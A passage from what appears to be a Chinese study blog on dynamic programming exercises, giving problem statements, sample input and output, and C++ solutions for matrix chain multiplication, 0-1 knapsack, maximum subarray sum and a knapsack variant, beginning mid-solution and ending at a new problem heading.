class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">105</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> x[MAXN], y[MAXN];</span><br><span class="line">    <span class="keyword">int</span> c[MAXN][MAXN] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> m = <span class="built_in">strlen</span>(x);</span><br><span class="line">        <span class="keyword">int</span> n = <span class="built_in">strlen</span>(y);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (x[i<span class="number">-1</span>] == y[j<span class="number">-1</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    c[i][j] = c[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c[i - <span class="number">1</span>][j] &gt; c[i][j - <span class="number">1</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    c[i][j] = c[i - <span class="number">1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    c[i][j] = c[i][j - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; c[m][n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h3><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个矩阵{A1,A2,…,An}，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。</p><h4 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h4><p>输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：<br>第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。<br>接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1&lt;r, c&lt;100。<br>第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。</p><h4 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h4><p>对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。</p><p>数据保证结果不超过1e9。</p><h4 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3 2</span><br><span class="line">A 10 100</span><br><span class="line">B 5 50</span><br><span class="line">C 100 5</span><br><span class="line">ACB</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><h4 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7500</span><br><span class="line">MengMengDa</span><br></pre></td></tr></table></figure><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>矩阵连乘递归式：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/77d04c17b84e42c3.png" alt="img"></p><p>矩阵连乘的部分不是很复杂，一个函数即可完成，主要的代码量集中在数据的输入和转换上。</p><ul><li>用结构体Matrix表示矩阵的行和列</li><li>再map存储名字和对应的矩阵</li><li>将输入的矩阵转换为p数组的同时，判断每相邻的两个矩阵，前一矩阵的行数是否等于后一矩阵的列数，若存在不等的情况，直接输出<code>MengMengda</code>;否则将其列数存入p数组内</li></ul><h4 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">int</span> m[maxn][maxn];</span><br><span class="line"><span class="comment">//用Matrix表示一个矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MatrixLength</span><span class="params">(<span class="keyword">int</span> *p, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//置对角线为0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        m[i][i] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//该循环总共n-1次</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">2</span>; r &lt;= n; r++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//n-r+1表示每一斜列的个数，i表示行号</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n - r + <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = r - <span class="number">1</span> + i;</span><br><span class="line">            <span class="comment">//在第一个矩阵后面加断点</span></span><br><span class="line">            m[i][j] = m[i + <span class="number">1</span>][j] + p[i - <span class="number">1</span>] * p[i] * p[j];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = i + <span class="number">1</span>; k &lt; j; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//每次将断点的位置向后移位一次，并更新</span></span><br><span class="line">                <span class="keyword">int</span> t = m[i][k] + m[k + <span class="number">1</span>][j] + p[i - <span class="number">1</span>] * p[k] * p[j];</span><br><span class="line">                <span class="keyword">if</span> (t &lt; m[i][j])</span><br><span class="line">                &#123;</span><br><span class="line">                    m[i][j] = t;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; m[<span class="number">1</span>][n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Matrix</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, l;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;l)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">char</span>, Matrix&gt; matrix;</span><br><span class="line">        <span class="keyword">while</span>(n--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> name;</span><br><span class="line">            <span class="keyword">int</span> row, col;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; name &gt;&gt; row &gt;&gt; col;</span><br><span class="line">            Matrix temp;</span><br><span class="line">            temp.r = row;</span><br><span class="line">            temp.c = col;</span><br><span class="line">            matrix[name] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> Multi;</span><br><span class="line">        <span class="keyword">int</span> p[<span class="number">105</span>];</span><br><span class="line">        <span class="keyword">while</span>(l--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; Multi;</span><br><span class="line">            <span class="keyword">int</span> len = Multi.length();</span><br><span class="line">            <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">            p[<span class="number">0</span>] = matrix[Multi[<span class="number">0</span>]].r;</span><br><span class="line">            p[<span class="number">1</span>] = matrix[Multi[<span class="number">0</span>]].c;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; len;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[Multi[j<span class="number">-1</span>]].c!=matrix[Multi[j]].r)</span><br><span class="line">                &#123;</span><br><span class="line">                    flag = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                p[j + <span class="number">1</span>] = matrix[Multi[j]].c;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"MengMengDa"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                MatrixLength(p, len);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h3><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><p>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p><h4 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h4><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p><p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p><h4 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h4><p>对每组测试数据，输出其对应的所装物品的最大价值。</p><h4 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">10 5</span><br><span class="line">2 6</span><br><span class="line">2 3</span><br><span class="line">6 5</span><br><span class="line">5 4</span><br><span class="line">4 6</span><br></pre></td></tr></table></figure><h4 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><h4 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h4><p><code>m(i,j)</code>表示背包容量为<code>j</code>，可选物品为<code>i,i+1,...,n</code>时的最优解。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/9d81c461d9be65f8.png" alt="img"></p><p>这一题不知道为什么用cin\cout就会报错，用<code>scanf</code>和<code>printf</code>则正确…</p><h4 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line">ll m[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    ll c, w[maxn], v[maxn];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;t);</span><br><span class="line">    <span class="comment">//cin &gt;&gt; t;</span></span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld %d"</span>, &amp;c, &amp;n);</span><br><span class="line">        <span class="comment">//cin &gt;&gt; c &gt;&gt; n;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%lld %lld"</span>, &amp;w[i], &amp;v[i]);</span><br><span class="line">            <span class="comment">//cin &gt;&gt; w[i] &gt;&gt; v[i];</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i,j,jMax = <span class="built_in">min</span>(w[n] - <span class="number">1</span>, c);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">            m[n][j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = w[n]; j &lt;= c; j++)</span><br><span class="line">            m[n][j] = v[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">1</span>; i--)</span><br><span class="line">        &#123;</span><br><span class="line">            jMax = <span class="built_in">min</span>(w[i] - <span class="number">1</span>, c);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">                m[i][j] = m[i + <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = w[i]; j &lt;= c; j++)</span><br><span class="line">                m[i][j] = <span class="built_in">max</span>(m[i + <span class="number">1</span>][j], m[i + <span class="number">1</span>][j - w[i]] + v[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        m[<span class="number">1</span>][c] = m[<span class="number">2</span>][c];</span><br><span class="line">        <span class="keyword">if</span> (c &gt;= w[<span class="number">1</span>])</span><br><span class="line">            m[<span class="number">1</span>][c] = <span class="built_in">max</span>(m[<span class="number">1</span>][c], m[<span class="number">2</span>][c - w[<span class="number">1</span>]] + v[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>, m[<span class="number">1</span>][c]);</span><br><span class="line">        <span class="comment">//cout &lt;&lt; m[1][c] &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最大子段和"><a href="#最大子段和" class="headerlink" title="最大子段和"></a>最大子段和</h3><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p><h4 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h4><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。</p><p>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。</p><p>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p><h4 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h4><p>输出其对应的最大子段和。</p><h4 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6</span><br><span class="line">2 -11 4 13 -1 2</span><br></pre></td></tr></table></figure><h4 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18</span><br></pre></td></tr></table></figure><h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><p>子段可为空集，答案为0</p><h4 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h4><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/47679c9f857e2ea1.png" alt="img"></p><p>递归方程如下，<code>b[j]</code>表示1到j的最大字段和：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/076e6bacb2091f1b.png" alt="img"></p><h4 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[i<span class="number">-1</span>]&gt;<span class="number">0</span>)</span><br><span class="line">                b[i] = b[i - <span class="number">1</span>] + a[i];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                b[i] = a[i];</span><br><span class="line">            sum = <span class="built_in">max</span>(sum, b[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="节食的限制"><a href="#节食的限制" class="headerlink" title="节食的限制"></a>节食的限制</h3><h4 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h4><p>Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。</p><h4 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h4><p>第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。</p><h4 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h4><p>一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。</p><h4 id="样例输入-8"><a href="#样例输入-8" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">56 4</span><br><span class="line">15</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h4 id="样例输出-8"><a href="#样例输出-8" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><h4 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h4><p>重量和价值相等的0-1背包问题。</p><h4 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">55</span>][<span class="number">45005</span>];</span><br><span class="line"><span class="keyword">int</span> w[<span class="number">55</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; c &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> jMax = <span class="built_in">min</span>(w[n] - <span class="number">1</span>, c);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">        dp[n][j] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = w[n]; j &lt;= c; j++)</span><br><span class="line">        dp[n][j] = w[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">1</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        jMax = <span class="built_in">min</span>(w[i] - <span class="number">1</span>, c);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">            dp[i][j] = dp[i + <span class="number">1</span>][j];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = w[i]; j &lt;= c; j++)</span><br><span class="line">            dp[i][j] = <span class="built_in">max</span>(dp[i + <span class="number">1</span>][j], dp[i + <span class="number">1</span>][j - w[i]] + w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">1</span>][c] = dp[<span class="number">2</span>][c];</span><br><span class="line">    <span class="keyword">if</span> (c &gt;= dp[<span class="number">1</span>][c])</span><br><span class="line">        dp[<span class="number">1</span>][c] = <span class="built_in">max</span>(dp[<span class="number">1</span>][c], dp[<span class="number">2</span>][c - w[<span class="number">1</span>]] + w[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; dp[<span class="number">1</span>][c] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="汽车费用"><a href="#汽车费用" class="headerlink" title="汽车费用"></a>汽车费用</h3><h4 id="题目描述-9"><a href="#题目描述-9" class="headerlink" 